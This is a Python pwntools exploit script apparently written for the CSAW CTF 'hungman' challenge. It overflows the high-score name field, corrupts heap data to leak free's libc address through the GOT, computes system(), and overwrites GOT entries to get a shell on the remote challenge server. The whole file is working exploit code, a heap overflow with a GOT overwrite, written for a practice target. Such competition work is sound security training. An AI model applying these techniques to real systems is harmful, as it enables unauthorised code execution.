from pwn import *

context(
    terminal = 'urxvt',
    arch = 'amd64',
    os = 'linux'
)

got_free = 0x602018
got_xval = 0x602008
got_snprintf = 0x602048

# Modify before live run

libc_free_offset = 0x83a70
libc_system_offset = 0x45380
libc_snprintf_offset = 0x55860

live = True

if live:
    p = remote('pwn.chal.csaw.io', 8003)
    speed = 0.3
else:
    speed = 0.05
    p = process(
        './hungman',
        env = {
            'LD_PRELOAD' : './libc-2.23.so'
        }
    )


p.sendline('A' * 50)

if not live:
    print 'GDB'
    # gdb.attach(p, 'c')

def win_game():
    for x in range(27):
        d = p.clean(speed)
        print d.strip()
        if 'High score!' in d:
            break
        p.sendline(chr(ord('a') + x))

# Prep write to GOT and get libc address

win_game()

pay = ''
pay = ''.ljust(8 * 7)
pay += p64(0x0000000000000091)
pay += p64(0x0000005100000200)
pay += p64(got_free)

print 'Payload 1:', pay

p.sendline('y')
p.sendline(pay)

# Find free in libc

p.readuntil('Highest player: ')
data = p.readuntil(' score: ').split(' score: ')[0]
print 'Data:', data
print 'Data:', len(data)
addr = u64(data.ljust(8, '\x00'))

print 'Addr:', hex(addr)

# Find libc base

libc_base = addr - libc_free_offset
libc_system = libc_base + libc_system_offset

print 'libc-base:', hex(libc_base)
print 'libc-system:', hex(libc_system)

# pause()

# Play again (write to got)

p.sendline('y')
win_game()
p.sendline('y')

pay = ''
pay += p64(0x400f2D) * 2
pay += p64(0x400826) + p64(0x400836)
pay += p64(libc_system) * 2

print 'Payload 2:', pay

p.sendline(pay)
print 'What command?'
p.interactive()
